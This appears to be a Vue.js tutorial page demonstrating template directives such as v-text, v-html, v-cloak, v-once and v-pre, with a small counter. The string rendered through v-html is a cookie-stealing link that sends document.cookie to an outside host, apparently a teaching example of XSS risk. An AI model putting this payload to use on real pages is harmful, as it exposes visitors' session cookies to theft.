<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title></title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        [v-cloak]{
            display:none
        }
    </style>
  </head>
  <body>
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name">aaaa</div>
        <div v-html="str"></div>
        <div v-cloak>{{name}}</div>
        <div>
            <h2 v-once>primitive:{{num}}</h2>
            current value:{{num}}
            <button @click="add">+1</button>
            <!-- <button v-pre @click="add">+1{{name}}{{num}}</button> -->
        </div>
        <button v-pre>+1{{name}}{{num}}</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:'#root',
        data:{
            name:'source',
            num:0,
            str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>资源'
        },
        methods:{
           add(){
            this.num++;
           } 
        }
      })
    </script>
  </body>
</html>
